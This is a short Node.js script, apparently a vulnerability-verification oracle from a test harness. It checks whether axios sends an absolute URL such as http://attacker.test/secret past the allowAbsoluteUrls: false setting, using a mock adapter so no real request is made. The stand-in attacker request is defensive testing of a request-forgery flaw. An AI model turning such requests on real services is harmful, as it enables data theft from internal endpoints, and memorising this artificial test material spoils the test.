const axios = require('axios');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const seen = [];

    const adapter = async (config) => {
      seen.push({
        url: config && config.url != null ? String(config.url) : '',
        baseURL: config && config.baseURL != null ? String(config.baseURL) : '',
        allowAbsoluteUrls: config ? config.allowAbsoluteUrls : undefined
      });
      return {
        data: { seenUrl: config.url, seenBaseURL: config.baseURL },
        status: 200,
        statusText: 'OK',
        headers: {},
        config,
        request: null
      };
    };

    const benignResp = await axios.get('/benign', {
      baseURL: 'http://localhost',
      allowAbsoluteUrls: false,
      adapter,
      validateStatus: () => true
    });

    const benignSeen = seen[0] ? seen[0].url : '';
    const benignOk = !!benignResp && benignResp.status === 200 && seen.length >= 1 && !/^https?:\/\//i.test(benignSeen);
    if (!benignOk) {
      throw new Error('benign call failed');
    }

    operation_completed = true;

    const beforeMaliciousCount = seen.length;
    let maliciousError = null;
    try {
      await axios.get('http://attacker.test/secret', {
        baseURL: 'http://localhost/base',
        allowAbsoluteUrls: false,
        adapter,
        validateStatus: () => true
      });
    } catch (e) {
      maliciousError = e;
    }

    const afterMaliciousCount = seen.length;
    const maliciousReachedAdapter = afterMaliciousCount > beforeMaliciousCount;
    const maliciousSeen = maliciousReachedAdapter ? seen[beforeMaliciousCount].url : '';
    const maliciousIsAbsolute = /^https?:\/\//i.test(maliciousSeen);

    exploit_succeeded = maliciousReachedAdapter && maliciousIsAbsolute;

    evidence = JSON.stringify({
      benignSeen,
      maliciousSeen,
      maliciousReachedAdapter,
      maliciousIsAbsolute,
      maliciousThrew: !!maliciousError,
      maliciousError: maliciousError ? (maliciousError.message || String(maliciousError)) : null
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure:' + (err && err.message ? err.message : String(err));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();